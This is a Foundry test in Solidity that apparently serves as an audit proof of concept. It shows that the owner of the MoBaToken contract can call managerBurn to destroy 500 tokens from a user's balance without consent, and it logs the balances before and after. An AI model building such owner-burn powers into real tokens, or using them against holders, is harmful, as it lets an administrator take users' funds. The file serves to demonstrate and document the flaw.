// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MoBaToken.sol";

contract AtomicityViolationTest is Test {
    MoBaToken private token;
    address private owner = address(0x1);
    address private user = address(0x2);
    uint256 private constant MINT_AMOUNT = 1000 ether;

    function setUp() public {
        vm.startPrank(owner);
        token = new MoBaToken("AtomicViolationToken", "ATOM");
        vm.stopPrank();
    }

    function test_OwnerCanBurnUsersTokensWithoutPermission() public {
        // Minting tokens to user
        vm.startPrank(owner);
        token.cross(user, MINT_AMOUNT);
        vm.stopPrank();
        
        // BEFORE: State snapshot
        console.log("--- BEFORE-Trigger Burn ---");
        uint256 userBalanceBefore = token.balanceOf(user);
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("User balance (BEFORE):", userBalanceBefore);
        console.log("Total supply (BEFORE):", totalSupplyBefore);
        
        uint256 burnAmount = 500 ether;
        
        // TRIGGER: Malicious burn operation
        console.log("--- Trigger Burn (%s tokens) ---", burnAmount);
        vm.prank(owner);
        token.managerBurn(user, burnAmount);
        
        // AFTER: State snapshot
        console.log("--- AFTER-Trigger Burn ---");
        uint256 userBalanceAfter = token.balanceOf(user);
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("User balance (AFTER):", userBalanceAfter);
        console.log("Total supply (AFTER):", totalSupplyAfter);
        
        // State comparison
        bool userBalanceChange = (userBalanceAfter == userBalanceBefore - burnAmount);
        bool totalSupplyChange = (totalSupplyAfter == totalSupplyBefore - burnAmount);
        bool vulnerabilityExists = userBalanceChange && totalSupplyChange;
        
        // Differential verification
        console.log("--- Differential Results ---");
        console.log("User balance changed as expected:", userBalanceChange ? "YES" : "NO");
        console.log("Total supply changed as expected:", totalSupplyChange ? "YES" : "NO");
        
        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Owner successfully burned users tokens without permission");
        } else {
            console.log("Vulnerability not Exist: Unauthorized token burning was not possible or state change failed");
        }
        
        // Ensure test passes only if vulnerability exists
        assertTrue(vulnerabilityExists, "Vulnerabiilty not successfully exploited");
    }
}